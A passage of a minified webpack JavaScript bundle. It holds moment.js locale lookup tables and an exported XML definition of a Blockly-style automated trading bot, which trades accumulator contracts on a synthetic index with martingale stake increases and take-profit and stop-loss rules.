(() => {
    var e = {
            674: function() {},
            12199: function() {},
            13282: function(e, t, n) {
                var a = {
                    "./zh-mo": "99807",
                    "./br": "1278",
                    "./is": "90135",
                    "./lt": "57010",
                    "./ur.js": "13795",
                    "./tlh": "89444",
                    "./eu.js": "77763",
                    "./uk.js": "67691",
                    "./jv.js": "24286",
                    "./ku.js": "1408",
                    "./ne": "16744",
                    "./nl": "93901",
                    "./ug-cn": "9288",
                    "./fil.js": "42549",
                    "./hr": "30316",
                    "./sv.js": "98760",
                    "./hy-am.js": "11423",
                    "./fr-ch": "52330",
                    "./en-nz": "76319",
                    "./bn-bd.js": "76225",
                    "./it-ch": "10150",
                    "./es-do": "55251",
                    "./ms-my": "41237",
                    "./en-ie.js": "46436",
                    "./ss.js": "95606",
                    "./mk": "95966",
                    "./mr": "10370",
                    "./pl": "64495",
                    "./te": "23110",
                    "./ms.js": "9847",
                    "./ar-kw": "96135",
                    "./zh-cn": "83839",
                    "./es-do.js": "55251",
                    "./bs.js": "80622",
                    "./mt.js": "72126",
                    "./hi": "30094",
                    "./uz": "6791",
                    "./fr-ch.js": "52330",
                    "./ar-ma": "47702",
                    "./en-in": "44175",
                    "./en-gb": "22243",
                    "./me.js": "39861",
                    "./tzl": "28254",
                    "./x-pseudo.js": "14378",
                    "./fil": "42549",
                    "./zh-hk.js": "55726",
                    "./el.js": "50837",
                    "./fa": "76959",
                    "./de-at.js": "60217",
                    "./fo": "94694",
                    "./ja": "39183",
                    "./mi": "35493",
                    "./gom-deva": "27884",
                    "./sr": "49131",
                    "./my.js": "56165",
                    "./cv": "50877",
                    "./ga": "29295",
                    "./af.js": "42786",
                    "./ar-ma.js": "47702",
                    "./nb": "64924",
                    "./sr-cyrl": "79915",
                    "./tg.js": "27321",
                    "./tk": "19005",
                    "./tr": "72397",
                    "./en-il": "47207",
                    "./en-sg.js": "31662",
                    "./en-in.js": "44175",
                    "./en-gb.js": "22243",
                    "./bm": "67438",
                    "./eu": "77763",
                    "./lo": "55466",
                    "./gom-latn.js": "23168",
                    "./tk.js": "19005",
                    "./zh-tw": "74152",
                    "./fr-ca.js": "63049",
                    "./cv.js": "50877",
                    "./hi.js": "30094",
                    "./lb.js": "36841",
                    "./pa-in": "15858",
                    "./sk.js": "64249",
                    "./nl-be.js": "59814",
                    "./az": "31083",
                    "./el": "50837",
                    "./es": "55655",
                    "./ku": "1408",
                    "./ro": "96459",
                    "./de-ch.js": "60894",
                    "./sl.js": "14985",
                    "./bs": "80622",
                    "./it": "90626",
                    "./sv": "98760",
                    "./be.js": "9808",
                    "./nn.js": "83877",
                    "./cy": "47373",
                    "./bg.js": "68338",
                    "./gd": "2101",
                    "./mt": "72126",
                    "./tg": "27321",
                    "./zh-tw.js": "74152",
                    "./nb.js": "64924",
                    "./gl": "38794",
                    "./oc-lnc": "92135",
                    "./ar-ly": "56440",
                    "./de-at": "60217",
                    "./en-il.js": "47207",
                    "./fi.js": "11897",
                    "./mi.js": "35493",
                    "./km.js": "18758",
                    "./ne.js": "16744",
                    "./mk.js": "95966",
                    "./de-ch": "60894",
                    "./ar-tn.js": "37100",
                    "./id": "29218",
                    "./is.js": "90135",
                    "./da.js": "24780",
                    "./pt-br": "57971",
                    "./sw.js": "91172",
                    "./tzl.js": "28254",
                    "./uz.js": "6791",
                    "./kn.js": "79282",
                    "./ar-ly.js": "56440",
                    "./nl.js": "93901",
                    "./br.js": "1278",
                    "./si.js": "90124",
                    "./uz-latn.js": "60588",
                    "./sr-cyrl.js": "79915",
                    "./en-au.js": "78348",
                    "./bo": "11560",
                    "./sd": "40950",
                    "./en-sg": "31662",
                    "./sk": "64249",
                    "./ca": "2468",
                    "./fi": "11897",
                    "./cs.js": "5822",
                    "./gl.js": "38794",
                    "./es-mx": "96112",
                    "./ky.js": "33291",
                    "./eo.js": "92915",
                    "./dv": "5300",
                    "./uk": "67691",
                    "./ur": "13795",
                    "./fo.js": "94694",
                    "./lo.js": "55466",
                    "./en-ca.js": "77925",
                    "./gd.js": "2101",
                    "./tzm-latn": "30699",
                    "./kk.js": "47772",
                    "./sq": "51104",
                    "./mr.js": "10370",
                    "./gom-deva.js": "27884",
                    "./gom-latn": "23168",
                    "./dv.js": "5300",
                    "./tl-ph.js": "75768",
                    "./ar-sa": "16040",
                    "./gu": "95349",
                    "./fy.js": "5044",
                    "./bm.js": "67438",
                    "./kn": "79282",
                    "./tl-ph": "75768",
                    "./be": "9808",
                    "./et": "5603",
                    "./hu": "22138",
                    "./te.js": "23110",
                    "./tzm": "51106",
                    "./vi": "65666",
                    "./ml.js": "87341",
                    "./nl-be": "59814",
                    "./zh-mo.js": "99807",
                    "./cs": "5822",
                    "./mn": "5115",
                    "./ta": "27333",
                    "./tet.js": "52095",
                    "./th": "9041",
                    "./vi.js": "65666",
                    "./zh-hk": "55726",
                    "./ga.js": "29295",
                    "./it.js": "90626",
                    "./ar-ps.js": "20315",
                    "./et.js": "5603",
                    "./hu.js": "22138",
                    "./ar": "30867",
                    "./he": "24206",
                    "./hr.js": "30316",
                    "./ru": "21793",
                    "./yo": "75805",
                    "./bn-bd": "76225",
                    "./pa-in.js": "15858",
                    "./ar-kw.js": "96135",
                    "./ta.js": "27333",
                    "./tr.js": "72397",
                    "./fr": "94470",
                    "./fy": "5044",
                    "./me": "39861",
                    "./ml": "87341",
                    "./ms": "9847",
                    "./ku-kmr.js": "90563",
                    "./ms-my.js": "41237",
                    "./pt": "89520",
                    "./ar-ps": "20315",
                    "./ar.js": "30867",
                    "./kk": "47772",
                    "./ky": "33291",
                    "./oc-lnc.js": "92135",
                    "./ko.js": "33730",
                    "./id.js": "29218",
                    "./pl.js": "64495",
                    "./se": "10490",
                    "./sl": "14985",
                    "./ss": "95606",
                    "./ro.js": "96459",
                    "./he.js": "24206",
                    "./sd.js": "40950",
                    "./en-au": "78348",
                    "./ka.js": "12105",
                    "./da": "24780",
                    "./my": "56165",
                    "./bn.js": "8905",
                    "./az.js": "31083",
                    "./en-ie": "46436",
                    "./se.js": "10490",
                    "./pt.js": "89520",
                    "./bo.js": "11560",
                    "./zh-cn.js": "83839",
                    "./lt.js": "57010",
                    "./ar-dz.js": "14130",
                    "./tet": "52095",
                    "./es-us.js": "71146",
                    "./bg": "68338",
                    "./bn": "8905",
                    "./en-ca": "77925",
                    "./eo": "92915",
                    "./fr.js": "94470",
                    "./hy-am": "11423",
                    "./lb": "36841",
                    "./lv.js": "37595",
                    "./es-us": "71146",
                    "./x-pseudo": "14378",
                    "./ca.js": "2468",
                    "./it-ch.js": "10150",
                    "./ja.js": "39183",
                    "./th.js": "9041",
                    "./jv": "24286",
                    "./gu.js": "95349",
                    "./ku-kmr": "90563",
                    "./ar-sa.js": "16040",
                    "./af": "42786",
                    "./de.js": "59740",
                    "./fa.js": "76959",
                    "./ka": "12105",
                    "./ko": "33730",
                    "./sq.js": "51104",
                    "./tlh.js": "89444",
                    "./yo.js": "75805",
                    "./sr.js": "49131",
                    "./ar-tn": "37100",
                    "./ar-dz": "14130",
                    "./uz-latn": "60588",
                    "./lv": "37595",
                    "./ru.js": "21793",
                    "./si": "90124",
                    "./sw": "91172",
                    "./tzm.js": "51106",
                    "./en-nz.js": "76319",
                    "./es.js": "55655",
                    "./pt-br.js": "57971",
                    "./cy.js": "47373",
                    "./mn.js": "5115",
                    "./de": "59740",
                    "./fr-ca": "63049",
                    "./km": "18758",
                    "./nn": "83877",
                    "./ug-cn.js": "9288",
                    "./es-mx.js": "96112",
                    "./tzm-latn.js": "30699"
                };

                function i(e) {
                    return Promise.resolve().then(function() {
                        if (!n.o(a, e)) {
                            var t = Error("Cannot find module '" + e + "'");
                            throw t.code = "MODULE_NOT_FOUND", t
                        }
                        var i = a[e];
                        return n.t(i, 23)
                    })
                }
                i.keys = () => Object.keys(a), i.id = "13282", e.exports = i
            },
            26058: function(e, t, n) {
                var a = {
                    "./af": "42786",
                    "./af.js": "42786",
                    "./ar": "30867",
                    "./ar-dz": "14130",
                    "./ar-dz.js": "14130",
                    "./ar-kw": "96135",
                    "./ar-kw.js": "96135",
                    "./ar-ly": "56440",
                    "./ar-ly.js": "56440",
                    "./ar-ma": "47702",
                    "./ar-ma.js": "47702",
                    "./ar-ps": "20315",
                    "./ar-ps.js": "20315",
                    "./ar-sa": "16040",
                    "./ar-sa.js": "16040",
                    "./ar-tn": "37100",
                    "./ar-tn.js": "37100",
                    "./ar.js": "30867",
                    "./az": "31083",
                    "./az.js": "31083",
                    "./be": "9808",
                    "./be.js": "9808",
                    "./bg": "68338",
                    "./bg.js": "68338",
                    "./bm": "67438",
                    "./bm.js": "67438",
                    "./bn": "8905",
                    "./bn-bd": "76225",
                    "./bn-bd.js": "76225",
                    "./bn.js": "8905",
                    "./bo": "11560",
                    "./bo.js": "11560",
                    "./br": "1278",
                    "./br.js": "1278",
                    "./bs": "80622",
                    "./bs.js": "80622",
                    "./ca": "2468",
                    "./ca.js": "2468",
                    "./cs": "5822",
                    "./cs.js": "5822",
                    "./cv": "50877",
                    "./cv.js": "50877",
                    "./cy": "47373",
                    "./cy.js": "47373",
                    "./da": "24780",
                    "./da.js": "24780",
                    "./de": "59740",
                    "./de-at": "60217",
                    "./de-at.js": "60217",
                    "./de-ch": "60894",
                    "./de-ch.js": "60894",
                    "./de.js": "59740",
                    "./dv": "5300",
                    "./dv.js": "5300",
                    "./el": "50837",
                    "./el.js": "50837",
                    "./en-au": "78348",
                    "./en-au.js": "78348",
                    "./en-ca": "77925",
                    "./en-ca.js": "77925",
                    "./en-gb": "22243",
                    "./en-gb.js": "22243",
                    "./en-ie": "46436",
                    "./en-ie.js": "46436",
                    "./en-il": "47207",
                    "./en-il.js": "47207",
                    "./en-in": "44175",
                    "./en-in.js": "44175",
                    "./en-nz": "76319",
                    "./en-nz.js": "76319",
                    "./en-sg": "31662",
                    "./en-sg.js": "31662",
                    "./eo": "92915",
                    "./eo.js": "92915",
                    "./es": "55655",
                    "./es-do": "55251",
                    "./es-do.js": "55251",
                    "./es-mx": "96112",
                    "./es-mx.js": "96112",
                    "./es-us": "71146",
                    "./es-us.js": "71146",
                    "./es.js": "55655",
                    "./et": "5603",
                    "./et.js": "5603",
                    "./eu": "77763",
                    "./eu.js": "77763",
                    "./fa": "76959",
                    "./fa.js": "76959",
                    "./fi": "11897",
                    "./fi.js": "11897",
                    "./fil": "42549",
                    "./fil.js": "42549",
                    "./fo": "94694",
                    "./fo.js": "94694",
                    "./fr": "94470",
                    "./fr-ca": "63049",
                    "./fr-ca.js": "63049",
                    "./fr-ch": "52330",
                    "./fr-ch.js": "52330",
                    "./fr.js": "94470",
                    "./fy": "5044",
                    "./fy.js": "5044",
                    "./ga": "29295",
                    "./ga.js": "29295",
                    "./gd": "2101",
                    "./gd.js": "2101",
                    "./gl": "38794",
                    "./gl.js": "38794",
                    "./gom-deva": "27884",
                    "./gom-deva.js": "27884",
                    "./gom-latn": "23168",
                    "./gom-latn.js": "23168",
                    "./gu": "95349",
                    "./gu.js": "95349",
                    "./he": "24206",
                    "./he.js": "24206",
                    "./hi": "30094",
                    "./hi.js": "30094",
                    "./hr": "30316",
                    "./hr.js": "30316",
                    "./hu": "22138",
                    "./hu.js": "22138",
                    "./hy-am": "11423",
                    "./hy-am.js": "11423",
                    "./id": "29218",
                    "./id.js": "29218",
                    "./is": "90135",
                    "./is.js": "90135",
                    "./it": "90626",
                    "./it-ch": "10150",
                    "./it-ch.js": "10150",
                    "./it.js": "90626",
                    "./ja": "39183",
                    "./ja.js": "39183",
                    "./jv": "24286",
                    "./jv.js": "24286",
                    "./ka": "12105",
                    "./ka.js": "12105",
                    "./kk": "47772",
                    "./kk.js": "47772",
                    "./km": "18758",
                    "./km.js": "18758",
                    "./kn": "79282",
                    "./kn.js": "79282",
                    "./ko": "33730",
                    "./ko.js": "33730",
                    "./ku": "1408",
                    "./ku-kmr": "90563",
                    "./ku-kmr.js": "90563",
                    "./ku.js": "1408",
                    "./ky": "33291",
                    "./ky.js": "33291",
                    "./lb": "36841",
                    "./lb.js": "36841",
                    "./lo": "55466",
                    "./lo.js": "55466",
                    "./lt": "57010",
                    "./lt.js": "57010",
                    "./lv": "37595",
                    "./lv.js": "37595",
                    "./me": "39861",
                    "./me.js": "39861",
                    "./mi": "35493",
                    "./mi.js": "35493",
                    "./mk": "95966",
                    "./mk.js": "95966",
                    "./ml": "87341",
                    "./ml.js": "87341",
                    "./mn": "5115",
                    "./mn.js": "5115",
                    "./mr": "10370",
                    "./mr.js": "10370",
                    "./ms": "9847",
                    "./ms-my": "41237",
                    "./ms-my.js": "41237",
                    "./ms.js": "9847",
                    "./mt": "72126",
                    "./mt.js": "72126",
                    "./my": "56165",
                    "./my.js": "56165",
                    "./nb": "64924",
                    "./nb.js": "64924",
                    "./ne": "16744",
                    "./ne.js": "16744",
                    "./nl": "93901",
                    "./nl-be": "59814",
                    "./nl-be.js": "59814",
                    "./nl.js": "93901",
                    "./nn": "83877",
                    "./nn.js": "83877",
                    "./oc-lnc": "92135",
                    "./oc-lnc.js": "92135",
                    "./pa-in": "15858",
                    "./pa-in.js": "15858",
                    "./pl": "64495",
                    "./pl.js": "64495",
                    "./pt": "89520",
                    "./pt-br": "57971",
                    "./pt-br.js": "57971",
                    "./pt.js": "89520",
                    "./ro": "96459",
                    "./ro.js": "96459",
                    "./ru": "21793",
                    "./ru.js": "21793",
                    "./sd": "40950",
                    "./sd.js": "40950",
                    "./se": "10490",
                    "./se.js": "10490",
                    "./si": "90124",
                    "./si.js": "90124",
                    "./sk": "64249",
                    "./sk.js": "64249",
                    "./sl": "14985",
                    "./sl.js": "14985",
                    "./sq": "51104",
                    "./sq.js": "51104",
                    "./sr": "49131",
                    "./sr-cyrl": "79915",
                    "./sr-cyrl.js": "79915",
                    "./sr.js": "49131",
                    "./ss": "95606",
                    "./ss.js": "95606",
                    "./sv": "98760",
                    "./sv.js": "98760",
                    "./sw": "91172",
                    "./sw.js": "91172",
                    "./ta": "27333",
                    "./ta.js": "27333",
                    "./te": "23110",
                    "./te.js": "23110",
                    "./tet": "52095",
                    "./tet.js": "52095",
                    "./tg": "27321",
                    "./tg.js": "27321",
                    "./th": "9041",
                    "./th.js": "9041",
                    "./tk": "19005",
                    "./tk.js": "19005",
                    "./tl-ph": "75768",
                    "./tl-ph.js": "75768",
                    "./tlh": "89444",
                    "./tlh.js": "89444",
                    "./tr": "72397",
                    "./tr.js": "72397",
                    "./tzl": "28254",
                    "./tzl.js": "28254",
                    "./tzm": "51106",
                    "./tzm-latn": "30699",
                    "./tzm-latn.js": "30699",
                    "./tzm.js": "51106",
                    "./ug-cn": "9288",
                    "./ug-cn.js": "9288",
                    "./uk": "67691",
                    "./uk.js": "67691",
                    "./ur": "13795",
                    "./ur.js": "13795",
                    "./uz": "6791",
                    "./uz-latn": "60588",
                    "./uz-latn.js": "60588",
                    "./uz.js": "6791",
                    "./vi": "65666",
                    "./vi.js": "65666",
                    "./x-pseudo": "14378",
                    "./x-pseudo.js": "14378",
                    "./yo": "75805",
                    "./yo.js": "75805",
                    "./zh-cn": "83839",
                    "./zh-cn.js": "83839",
                    "./zh-hk": "55726",
                    "./zh-hk.js": "55726",
                    "./zh-mo": "99807",
                    "./zh-mo.js": "99807",
                    "./zh-tw": "74152",
                    "./zh-tw.js": "74152"
                };

                function i(e) {
                    return n(l(e))
                }

                function l(e) {
                    if (!n.o(a, e)) {
                        var t = Error("Cannot find module '" + e + "'");
                        throw t.code = "MODULE_NOT_FOUND", t
                    }
                    return a[e]
                }
                i.keys = function() {
                    return Object.keys(a)
                }, i.resolve = l, e.exports = i, i.id = "26058"
            },
            38218: function(e, t, n) {
                "use strict";
                n.r(t), n.d(t, {
                    default: function() {
                        return a
                    }
                });
                let a = '<xml xmlns="http://www.w3.org/1999/xhtml" is_dbot="true" collection="false">\n  <variables>\n    <variable type="" id="XJge~P|xa{DOQ7ERn6tt" islocal="false" iscloud="false">notifications</variable>\n    <variable type="" id="04q-.{_G9CBq.X?}P%IO" islocal="false" iscloud="false">initial_stake</variable>\n    <variable type="" id="S[tY,FqC12p:kfT^VLxC" islocal="false" iscloud="false">initial_acc_take_profit</variable>\n    <variable type="" id="[^Q7)A01y-@q!py6Gk`q" islocal="false" iscloud="false">TP</variable>\n    <variable type="" id="La:_zTw{G0#OAi$rQ/.d" islocal="false" iscloud="false">stake</variable>\n    <variable type="" id="@D#2+V%9X,H*:DQQmHal" islocal="false" iscloud="false">sma</variable>\n    <variable type="" id="!5[7i(P)_dM@+qczPE{%" islocal="false" iscloud="false">rsi</variable>\n    <variable type="" id="XSBe.@kGe^oO{Q}qzhuN" islocal="false" iscloud="false">% return</variable>\n    <variable type="" id="PT$/n3r(93P7|v+-%Z:1" islocal="false" iscloud="false">Take Profit</variable>\n    <variable type="" id="[JqTezGs|XI__n+r|^=z" islocal="false" iscloud="false">total_lost</variable>\n    <variable type="" id="(-wGh#rvkawQFN.ehx6S" islocal="false" iscloud="false">item</variable>\n    <variable type="" id="lYL57o(*helT*W(/I6XE" islocal="false" iscloud="false">martingale</variable>\n    <variable type="" id="2Thh`tp_xx[G`/W!/Ji2" islocal="false" iscloud="false">Stop Loss</variable>\n    <variable type="" id="T4K2eTJ*aWG9)14(IbLA" islocal="false" iscloud="false">Expected Profit</variable>\n    <variable type="" id="(^zcuRk{$#v1bMFGn-V[" islocal="false" iscloud="false">Max Loss</variable>\n    <variable type="" id="v0#K)Yv=:6aveYI=_VhD" islocal="false" iscloud="false">Tick1</variable>\n    <variable type="" id="-[Ex/`)z2txY;Be[@EIw" islocal="false" iscloud="false">Tick2</variable>\n    <variable type="" id="c5x[j6BD?M)k#Ju|WH:c" islocal="false" iscloud="false">+- Barrier</variable>\n  </variables>\n  <block type="trade_definition" id="_X.p:m=oq%~ovM~5/*bZ" deletable="false" x="0" y="56">\n    <statement name="TRADE_OPTIONS">\n      <block type="trade_definition_market" id="wwpO4C}AF`{rMt#;TAno" deletable="false" movable="false">\n        <field name="MARKET_LIST">synthetic_index</field>\n        <field name="SUBMARKET_LIST">random_index</field>\n        <field name="SYMBOL_LIST">1HZ10V</field>\n        <next>\n          <block type="trade_definition_tradetype" id="qfW2S=SdF?D!umatJ8|[" deletable="false" movable="false">\n            <field name="TRADETYPECAT_LIST">accumulator</field>\n            <field name="TRADETYPE_LIST">accumulator</field>\n            <next>\n              <block type="trade_definition_contracttype" id="%q,#{iUx9mab].$97lz#" deletable="false" movable="false">\n                <field name="TYPE_LIST">ACCU</field>\n                <next>\n                  <block type="trade_definition_candleinterval" id="{k#;S%V)wG~4r]{o,|/G" deletable="false" movable="false">\n                    <field name="CANDLEINTERVAL_LIST">60</field>\n                    <next>\n                      <block type="trade_definition_restartbuysell" id=".33J:D3i^%ZlP{[ndN]@" deletable="false" movable="false">\n                        <field name="TIME_MACHINE_ENABLED">FALSE</field>\n                        <next>\n                          <block type="trade_definition_restartonerror" id=":Se/q/Q[vY!DjSWCQh4@" deletable="false" movable="false">\n                            <field name="RESTARTONERROR">TRUE</field>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </next>\n          </block>\n        </next>\n      </block>\n    </statement>\n    <statement name="INITIALIZATION">\n      <block type="variables_set" id="mY.J.7q3kOA_KF*@t?]w">\n        <field name="VAR" id="c5x[j6BD?M)k#Ju|WH:c" variabletype="">+- Barrier</field>\n        <value name="VALUE">\n          <block type="math_number" id="gP7cfCI]_!A8Kiq@GN?D">\n            <field name="NUM">0.35</field>\n          </block>\n        </value>\n        <next>\n          <block type="variables_set" id="1k.{ZgG/T1|`~)MQ6`u|">\n            <field name="VAR" id="La:_zTw{G0#OAi$rQ/.d" variabletype="">stake</field>\n            <value name="VALUE">\n              <block type="math_number" id="b}O;@tW?a2qx#:]3@EZb">\n                <field name="NUM">2</field>\n              </block>\n            </value>\n            <next>\n              <block type="variables_set" id="yN0Rx~0a4v[AsR7`haXV">\n                <field name="VAR" id="T4K2eTJ*aWG9)14(IbLA" variabletype="">Expected Profit</field>\n                <value name="VALUE">\n                  <block type="math_number" id="fSXRt2MnM[?U8Jtn1w0R">\n                    <field name="NUM">5</field>\n                  </block>\n                </value>\n                <next>\n                  <block type="variables_set" id="M,BNE)U]ddbP`pP=C(z.">\n                    <field name="VAR" id="(^zcuRk{$#v1bMFGn-V[" variabletype="">Max Loss</field>\n                    <value name="VALUE">\n                      <block type="math_number" id="c5)~~MkSwD)d9OjVVOF^">\n                        <field name="NUM">35</field>\n                      </block>\n                    </value>\n                    <next>\n                      <block type="variables_set" id="r7K):8|XT*PrZ?~ocY`@">\n                        <field name="VAR" id="lYL57o(*helT*W(/I6XE" variabletype="">martingale</field>\n                        <value name="VALUE">\n                          <block type="math_number" id="F)]E0]E.l~wGx.,xPu6D">\n                            <field name="NUM">3</field>\n                          </block>\n                        </value>\n                        <next>\n                          <block type="variables_set" id="#+h9.]ksqpozBA4De0`z">\n                            <field name="VAR" id="[^Q7)A01y-@q!py6Gk`q" variabletype="">TP</field>\n                            <value name="VALUE">\n                              <block type="procedures_callreturn" id="S0FWCIE-mbZY3I7bSic~">\n                                <mutation name="%Take Profit">\n                                  <arg name="% return"></arg>\n                                </mutation>\n                                <data>`|HyrV{(=2kzuE||#1@h</data>\n                                <value name="ARG0">\n                                  <block type="math_number" id="1lGzvSPd_:~{_!8MwuNN">\n                                    <field name="NUM">30</field>\n                                  </block>\n                                </value>\n                              </block>\n                            </value>\n                            <next>\n                              <block type="procedures_callnoreturn" id="E6iU5E~a[gza4Etwos_?">\n                                <mutation name="RM"></mutation>\n                                <data>.e|16|%S+U3$1WmD:a!/</data>\n                              </block>\n                            </next>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </next>\n          </block>\n        </next>\n      </block>\n    </statement>\n    <statement name="SUBMARKET">\n      <block type="trade_definition_accumulator" id="#/,5Gyyr.:=|xiHHF=,R">\n        <field name="GROWTHRATE_LIST">0.03</field>\n        <value name="AMOUNT">\n          <shadow type="math_number_positive" id="ae@W?P9),$0UYfg-T(Np">\n            <field name="NUM">1</field>\n          </shadow>\n          <block type="variables_get" id="(6x4sSmCujjK+%9-tlkZ">\n            <field name="VAR" id="La:_zTw{G0#OAi$rQ/.d" variabletype="">stake</field>\n          </block>\n        </value>\n        <statement name="ACCUMULATOR_PARAMS">\n          <block type="accumulator_take_profit" id="IQ0NGBS7q]9$xlf]k7O]">\n            <value name="AMOUNT">\n              <shadow type="math_number_positive" id="}L#B5Nir[zGsP{HV1^hW">\n                <field name="NUM">0</field>\n              </shadow>\n              <block type="variables_get" id="-@hwgGItPPIKc[qkPWnP">\n                <field name="VAR" id="[^Q7)A01y-@q!py6Gk`q" variabletype="">TP</field>\n              </block>\n            </value>\n          </block>\n        </statement>\n      </block>\n    </statement>\n  </block>\n  <block type="after_purchase" id=";{7]2GG(I2lkbf[?$^bd" collapsed="true" x="844" y="56">\n    <statement name="AFTERPURCHASE_STACK">\n      <block type="controls_if" id="X|r:jP0}L!ZVvV+,S0~E">\n        <mutation else="1"></mutation>\n        <value name="IF0">\n          <block type="contract_check_result" id="eWPEsAsL%1I%5ya)^vHR">\n            <field name="CHECK_RESULT">win</field>\n          </block>\n        </value>\n        <statement name="DO0">\n          <block type="variables_set" id="cG$;R@Pk9XUruGyTX5PW">\n            <field name="VAR" id="[JqTezGs|XI__n+r|^=z" variabletype="">total_lost</field>\n            <value name="VALUE">\n              <block type="math_number" id="21.s@D2H+WUE1*HR=aFI">\n                <field name="NUM">0</field>\n              </block>\n            </value>\n            <next>\n              <block type="variables_set" id="c|u~06[.0IrZS7jpN..A">\n                <field name="VAR" id="La:_zTw{G0#OAi$rQ/.d" variabletype="">stake</field>\n                <value name="VALUE">\n                  <block type="variables_get" id="r~ab0]H30C[!%un_+~Oj">\n                    <field name="VAR" id="04q-.{_G9CBq.X?}P%IO" variabletype="">initial_stake</field>\n                  </block>\n                </value>\n                <next>\n                  <block type="variables_set" id="~6QHR-kd{1V_3BYhFTwE">\n                    <field name="VAR" id="[^Q7)A01y-@q!py6Gk`q" variabletype="">TP</field>\n                    <value name="VALUE">\n                      <block type="variables_get" id="OQM^6n0fA^IRnuN?7X3V">\n                        <field name="VAR" id="S[tY,FqC12p:kfT^VLxC" variabletype="">initial_acc_take_profit</field>\n                      </block>\n                    </value>\n                  </block>\n                </next>\n              </block>\n            </next>\n          </block>\n        </statement>\n        <statement name="ELSE">\n          <block type="math_change" id="HNPMqSy,5^fR`nf~Q1|d">\n            <field name="VAR" id="[JqTezGs|XI__n+r|^=z" variabletype="">total_lost</field>\n            <value name="DELTA">\n              <shadow type="math_number" id=";giZ=qHqZ:}TThKzZfJD">\n                <field name="NUM">1</field>\n              </shadow>\n              <block type="variables_get" id="zzcJ!L=%L*dkG,:6;K9G">\n                <field name="VAR" id="La:_zTw{G0#OAi$rQ/.d" variabletype="">stake</field>\n              </block>\n            </value>\n            <next>\n              <block type="variables_set" id="uycT*sV~JyW2h9c,pD?^">\n                <field name="VAR" id="[^Q7)A01y-@q!py6Gk`q" variabletype="">TP</field>\n                <value name="VALUE">\n                  <block type="variables_get" id="_E?zu9w-ll|sR4/WyO^b">\n                    <field name="VAR" id="[JqTezGs|XI__n+r|^=z" variabletype="">total_lost</field>\n                  </block>\n                </value>\n                <next>\n                  <block type="variables_set" id="DjcNJkBN()joV_rSUQ]U">\n                    <field name="VAR" id="La:_zTw{G0#OAi$rQ/.d" variabletype="">stake</field>\n                    <value name="VALUE">\n                      <block type="math_arithmetic" id="+oEX=r2ZP!X2svsTC}pa">\n                        <field name="OP">MULTIPLY</field>\n                        <value name="A">\n                          <shadow type="math_number" id="}UCd!RC71TGu/jis?;+_">\n                            <field name="NUM">1</field>\n                          </shadow>\n                          <block type="variables_get" id="ROmqU-!+lE+XTx1DJUSk">\n                            <field name="VAR" id="[JqTezGs|XI__n+r|^=z" variabletype="">total_lost</field>\n                          </block>\n                        </value>\n                        <value name="B">\n                          <shadow type="math_number" id=")pC5lPbav.`(537`p%h(">\n                            <field name="NUM">1</field>\n                          </shadow>\n                          <block type="variables_get" id="S3`j.AFO,Fq@-G?q_)zP">\n                            <field name="VAR" id="lYL57o(*helT*W(/I6XE" variabletype="">martingale</field>\n                          </block>\n                        </value>\n                      </block>\n                    </value>\n                  </block>\n                </next>\n              </block>\n            </next>\n          </block>\n        </statement>\n        <next>\n          <block type="controls_if" id="P.lw1+i!GYj#,^[U[a+|">\n            <mutation elseif="1" else="1"></mutation>\n            <value name="IF0">\n              <block type="logic_compare" id="KY,##8}g:YnoinZ^FW^W">\n                <field name="OP">GTE</field>\n                <value name="A">\n                  <block type="total_profit" id="(i4F6nkUD^uP0B{Snl~V"></block>\n                </value>\n                <value name="B">\n                  <block type="variables_get" id="5^ux?K;|LetdVlD~paj1">\n                    <field name="VAR" id="T4K2eTJ*aWG9)14(IbLA" variabletype="">Expected Profit</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <statement name="DO0">\n              <block type="set_tp" id="Xjy,yax%WJ?/xFa4r~P5"></block>\n            </statement>\n            <value name="IF1">\n              <block type="logic_compare" id="~:*,_~VY0B)]0=UCOTzt">\n                <field name="OP">LTE</field>\n                <value name="A">\n                  <block type="total_profit" id="Z6;h^f/-9i%cndk%ZM(K"></block>\n                </value>\n                <value name="B">\n                  <block type="math_single" id="A}w_M2MNMgf?J!=D55j#">\n                    <field name="OP">NEG</field>\n                    <value name="NUM">\n                      <shadow type="math_number" id="pL/FD_d9B|RmxiPH3%Vf">\n                        <field name="NUM">9</field>\n                      </shadow>\n                      <block type="variables_get" id="ZZV8%u/2Z+?zr3dva1h7">\n                        <field name="VAR" id="(^zcuRk{$#v1bMFGn-V[" variabletype="">Max Loss</field>\n                      </block>\n                    </value>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <statement name="DO1">\n              <block type="set_sl" id="B|ICDIfcaOc9Z^3~YLF1"></block>\n            </statement>\n            <statement name="ELSE">\n              <block type="trade_again" id="s.M0BL}NDrgOvAoo^Nm$"></block>\n            </statement>\n          </block>\n        </next>\n      </block>\n    </statement>\n  </block>\n  <block type="before_purchase" id="LTYQ(lZoYDBNSxCl+i@m" deletable="false" x="0" y="1040">\n    <statement name="BEFOREPURCHASE_STACK">\n      <block type="controls_if" id="t-/FKs@88x!R%]4{UQe*">\n        <mutation elseif="1"></mutation>\n        <value name="IF0">\n          <block type="logic_compare" id="6uNEh46*{yKE,~u?~537">\n            <field name="OP">GTE</field>\n            <value name="A">\n              <block type="math_arithmetic" id=";9#hw{S2h.OBQj5,EOD^">\n                <field name="OP">MINUS</field>\n                <value name="A">\n                  <shadow type="math_number" id="#Lo{5mjQ+oY::#O%2NFm">\n                    <field name="NUM">1</field>\n                  </shadow>\n                  <block type="variables_get" id="6!RFKc1!qxMj[;G]w(?a">\n                    <field name="VAR" id="v0#K)Yv=:6aveYI=_VhD" variabletype="">Tick1</field>\n                  </block>\n                </value>\n                <value name="B">\n                  <shadow type="math_number" id="bI)gM`(_lSU%Ifoy}}jO">\n                    <field name="NUM">1</field>\n                  </shadow>\n                  <block type="variables_get" id="p_[]7/QyMI!cwd[m{H`(">\n                    <field name="VAR" id="-[Ex/`)z2txY;Be[@EIw" variabletype="">Tick2</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <value name="B">\n              <block type="variables_get" id="kD9-m*v+eoZhRsK%gh#}">\n                <field name="VAR" id="c5x[j6BD?M)k#Ju|WH:c" variabletype="">+- Barrier</field>\n              </block>\n            </value>\n          </block>\n        </value>\n        <statement name="DO0">\n          <block type="apollo_purchase" id="GDnqv$.FzwC(0IHe0]I/">\n            <field 